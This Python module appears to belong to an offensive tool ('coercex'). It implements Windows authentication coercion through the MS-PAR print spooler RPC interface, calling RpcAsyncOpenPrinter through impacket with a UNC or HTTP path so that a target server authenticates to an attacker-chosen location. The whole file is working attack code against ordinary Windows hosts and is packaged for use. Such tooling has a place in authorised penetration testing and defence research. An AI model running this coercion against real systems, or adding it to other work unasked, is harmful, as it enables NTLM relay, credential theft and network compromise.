"""MS-PAR (Print System Asynchronous Remote Protocol) coercion methods.

PrintNightmare-adjacent - uses the IRemoteWinspool async interface.
Similar to PrinterBug but via a different RPC interface.
"""

from __future__ import annotations

from impacket.dcerpc.v5 import par
from impacket.dcerpc.v5.dtypes import NULL

from coercex.methods.base import CoercionMethod, PipeBinding

# IRemoteWinspool interface
PAR_UUID = "76f03f96-cdfd-44fc-a22c-64950a001209"

PAR_PIPES = [
    PipeBinding(pipe=r"\PIPE\spoolss", uuid=PAR_UUID, version="1.0"),
]

PAR_PATH_STYLES = [
    ("smb", "bare"),
    ("http", "bare"),
]

PROTOCOL_SHORT = "MS-PAR"
PROTOCOL_LONG = "[MS-PAR]: Print System Asynchronous Remote Protocol"


def _trigger_async_open_printer(dce, path, target):
    """RpcAsyncOpenPrinter - open a printer using a UNC path as the name.

    This forces the server to validate the printer path, triggering auth.
    """
    par.hRpcAsyncOpenPrinter(dce, path)


def get_methods() -> list[CoercionMethod]:
    """Return all MS-PAR coercion methods."""
    return [
        CoercionMethod(
            protocol_short=PROTOCOL_SHORT,
            protocol_long=PROTOCOL_LONG,
            function_name="RpcAsyncOpenPrinter",
            opnum=0,
            vuln_args=["pPrinterName"],
            pipe_bindings=list(PAR_PIPES),
            path_styles=list(PAR_PATH_STYLES),
            trigger_fn=_trigger_async_open_printer,
        ),
    ]
